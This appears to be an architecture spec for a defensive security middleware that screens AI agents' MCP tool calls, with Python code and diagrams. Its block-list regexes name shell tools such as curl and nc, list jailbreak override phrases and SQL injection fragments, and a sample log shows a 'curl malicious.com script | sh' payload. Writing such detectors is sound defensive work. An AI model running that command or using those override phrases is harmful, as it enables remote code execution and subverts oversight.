# V2 Architecture: MCP Security Middleware & Immune System

## 1. Executive Summary & Philosophy
The Model Context Protocol (MCP) Security Middleware, dubbed the "Immune System," acts as the definitive security boundary between external LLM inferences and internal system executions. Inspired by biological immune systems, it does not just statically block threats; it detects anomalies, isolates compromised context, adapts to new attack vectors, and continuously monitors agent behaviors for prompt injection, arbitrary code execution, and unauthorized state mutations.

This document serves as the absolute source of truth for the implementation of the V2 MCP Security Middleware, covering all edge cases, data structures, patterns, and architectural workflows.

## 2. Core Architecture & Data Flow

### 2.1 System Context Diagram
The middleware intercepts all MCP Protocol messages (`CallTool`, `ReadResource`, `Prompt`) before they reach the execution engine.

```mermaid
graph TD
    A[External LLM / Agent] -->|MCP Request| B[MCP Gateway / Entrypoint]
    B --> C{Immune System Middleware}
    C -->|1. Context Validator| D[Schema & Sanitization]
    C -->|2. Threat Analyzer| E[Regex & Heuristic Engine]
    C -->|3. RBAC Policy Check| F[Role-Based Access Control]
    D --> E
    E --> F
    F -->|Approved| G[Execution Engine / Tool Runner]
    F -->|Rejected| H[Quarantine & Alerting]
    G -->|Execution Result| I{Egress Validator}
    I -->|Safe Result| B
    I -->|Data Leakage Detected| H
```

### 2.2 Detailed Sequence Diagram (Request Lifecycle)
```mermaid
sequenceDiagram
    participant Agent as LLM Agent
    participant GW as MCP Gateway
    participant IM as Immune System
    participant Reg as Regex/Heuristics
    participant Exec as Tool Execution Engine
    participant Audit as Audit Logger
    
    Agent->>GW: CallTool(tool_name, params)
    GW->>IM: ValidateRequest(context)
    IM->>Reg: Check Payload (Blacklist/Whitelist)
    alt Threat Detected
        Reg-->>IM: Threat Alert (e.g., Prompt Injection)
        IM->>Audit: LogSecurityEvent(Threat)
        IM-->>GW: SecurityException (Access Denied)
        GW-->>Agent: Error: Unauthorized Action
    else Payload Safe
        Reg-->>IM: Safe
        IM->>Exec: ExecuteTool(tool_name, sanitized_params)
        Exec-->>IM: Return Raw Output
        IM->>Reg: EgressCheck(Raw Output)
        alt PII/Secrets Detected
            Reg-->>IM: Redaction Required
            IM->>Audit: LogSecurityEvent(Data Leak Prevented)
            IM-->>GW: Return Redacted Output
        else Safe Egress
            Reg-->>IM: Safe
            IM-->>GW: Return Output
            GW-->>Agent: Success Response
        end
    end
```

## 3. Component Details & Python Implementations

The Immune System is composed of three primary layers: Ingress Sanitizer, Threat Detector, and Egress Filter.

### 3.1 Data Models (Pydantic V2)
```python
from pydantic import BaseModel, Field
from typing import Dict, Any, List, Optional
from enum import Enum
from datetime import datetime

class SecurityLevel(str, Enum):
    LOW = "LOW"
    MEDIUM = "MEDIUM"
    HIGH = "HIGH"
    CRITICAL = "CRITICAL"

class EventType(str, Enum):
    PROMPT_INJECTION = "PROMPT_INJECTION"
    PATH_TRAVERSAL = "PATH_TRAVERSAL"
    COMMAND_INJECTION = "COMMAND_INJECTION"
    DATA_LEAKAGE = "DATA_LEAKAGE"
    UNAUTHORIZED_ACCESS = "UNAUTHORIZED_ACCESS"
    SAFE_EXECUTION = "SAFE_EXECUTION"

class SecurityEventContext(BaseModel):
    timestamp: datetime = Field(default_factory=datetime.utcnow)
    agent_id: str
    tool_name: str
    suspicious_payload: Optional[str] = None
    severity: SecurityLevel
    event_type: EventType

class ValidationResult(BaseModel):
    is_safe: bool
    sanitized_params: Dict[str, Any] = {}
    error_message: Optional[str] = None
    security_event: Optional[SecurityEventContext] = None
```

### 3.2 Core Immune System Class
```python
import re
import logging
from typing import Dict, Any

logger = logging.getLogger("mcp.immune_system")

class MCPImmuneSystem:
    """
    Main middleware class for inspecting and sanitizing all MCP traffic.
    """
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.blacklist_patterns = self._compile_patterns(config.get("blacklist", []))
        self.whitelist_patterns = self._compile_patterns(config.get("whitelist", []))
        self.secret_patterns = self._compile_patterns(config.get("secrets", []))
        
    def _compile_patterns(self, patterns: List[str]) -> List[re.Pattern]:
        return [re.compile(p, re.IGNORECASE) for p in patterns]

    def validate_ingress(self, agent_id: str, tool_name: str, params: Dict[str, Any]) -> ValidationResult:
        # 1. Check Tool Allowlist for Agent
        if not self._check_rbac(agent_id, tool_name):
            return self._build_rejection(agent_id, tool_name, EventType.UNAUTHORIZED_ACCESS)

        # 2. Iterate through parameters and scan for threats
        for key, value in params.items():
            if isinstance(value, str):
                threat = self._detect_threat(value)
                if threat:
                    return self._build_rejection(
                        agent_id, tool_name, threat, payload=value
                    )
                    
        # 3. Path Traversal & Command Injection specific checks
        if tool_name in ["read_file", "write_file", "execute_command"]:
            if self._detect_path_traversal(str(params)):
                return self._build_rejection(agent_id, tool_name, EventType.PATH_TRAVERSAL)

        return ValidationResult(is_safe=True, sanitized_params=params)

    def validate_egress(self, raw_output: str) -> str:
        # Prevent PII or Secrets from leaking back to the agent
        redacted_output = raw_output
        for pattern in self.secret_patterns:
            redacted_output = pattern.sub("[REDACTED]", redacted_output)
        return redacted_output

    def _detect_threat(self, payload: str) -> Optional[EventType]:
        for pattern in self.blacklist_patterns:
            if pattern.search(payload):
                return EventType.PROMPT_INJECTION
        return None
        
    def _detect_path_traversal(self, payload: str) -> bool:
        traversal_pattern = re.compile(r"(\.\./|\.\.\\|%2e%2e%2f|%2e%2e%5c)", re.IGNORECASE)
        return bool(traversal_pattern.search(payload))
        
    def _build_rejection(self, agent_id, tool_name, event_type, payload=None) -> ValidationResult:
        event = SecurityEventContext(
            agent_id=agent_id,
            tool_name=tool_name,
            severity=SecurityLevel.CRITICAL,
            event_type=event_type,
            suspicious_payload=payload[:200] if payload else None
        )
        return ValidationResult(
            is_safe=False,
            error_message="Security Violation: Request blocked by Immune System.",
            security_event=event
        )
```

## 4. Threat Detection Regex Patterns

The core of the immune system relies on a combination of strict whitelisting and heuristic blacklisting.

### 4.1 Blacklist Regex (Ingress)
```python
# Command Injection Attempts
COMMAND_INJECTION_REGEX = r"(?:;|\||&&|`|\$\().*(?:bash|sh|cmd|powershell|curl|wget|nc|python|perl|ruby|php|exec|eval)"

# Prompt Injection / Jailbreak attempts
JAILBREAK_REGEX = r"(?i)(ignore previous instructions|disregard prior|system prompt|you are now|forget everything|bypass constraints)"

# SQL Injection (if passing queries directly)
SQL_INJECTION_REGEX = r"(?i)(UNION\s+SELECT|DROP\s+TABLE|--|1=1|WAITFOR\s+DELAY)"
```

### 4.2 Secret & PII Filtering (Egress)
```python
# AWS Keys
AWS_KEY_REGEX = r"(?i)AKIA[0-9A-Z]{16}"
# JWT Tokens
JWT_REGEX = r"ey[a-zA-Z0-9_-]{10,}\.ey[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}"
# Private Keys
PRIVATE_KEY_REGEX = r"-----BEGIN (?:RSA |OPENSSH )?PRIVATE KEY-----"
```

## 5. Edge Cases and Exception Handling

The system must "fail closed" (default deny) under unexpected conditions.

| Edge Case | Middleware Behavior (Immune System Reaction) |
| --- | --- |
| **Malformed JSON Payload** | Reject immediately at gateway. Log as potential evasion attempt. |
| **Recursive Expansion (Zip Bomb)** | Enforce max payload length (e.g., 50KB) and nesting depth (max 5) on JSON parameters. Trigger `SecurityException`. |
| **Regex Denial of Service (ReDoS)** | All regex patterns must be tested for catastrophic backtracking. A watchdog timer (e.g., 50ms) terminates regex evaluation, assuming the payload is malicious. |
| **Obfuscated Path Traversal** | Detects double URL encoding (`%252e%252e%252f`), null byte injection (`%00`), and unicode variations of dots and slashes. |
| **Polymorphic Jailbreaks** | Utilizes semantic embedding similarity checks (via a lightweight local model) if regex heuristics fail to catch obfuscated prompt injections. |

## 6. Audit Logging Format (ELK / Splunk Target)
All blocked requests and sensitive tool executions must be logged in a strict JSON format for SIEM ingestion.

```json
{
  "timestamp": "2026-08-17T22:29:14+09:00",
  "component": "mcp_immune_system",
  "action": "BLOCK",
  "agent_id": "ee5a7b90-580f-469d-85da-dce853919921",
  "tool_invoked": "run_command",
  "event_type": "COMMAND_INJECTION",
  "severity": "CRITICAL",
  "metadata": {
    "ip_address": "local",
    "execution_time_ms": 14,
    "matched_pattern": "(?:;|\\||&&|`|\\$\\().*(?:bash|sh|cmd|powershell)"
  },
  "payload_snippet": "ls -la; curl http://malicious.com/script.sh | sh"
}
```

## 7. Performance Constraints
Since the Immune System sits in the critical path of every single agent thought/action loop, it operates under extreme performance requirements:
1. **P99 Latency:** < 25ms overhead per tool invocation.
2. **Regex Execution:** Must use RE2 or a guaranteed linear-time regex engine to prevent ReDoS.
3. **Memory Footprint:** < 50MB resident memory per worker.

## 8. Conclusion
The V2 MCP Security Middleware introduces a robust, fail-safe layer that ensures Autonomous Agents cannot accidentally or maliciously compromise the host environment. By treating LLM outputs as untrusted user input and enforcing granular RBAC alongside continuous egress scanning, the "Immune System" guarantees the integrity of the workspace.
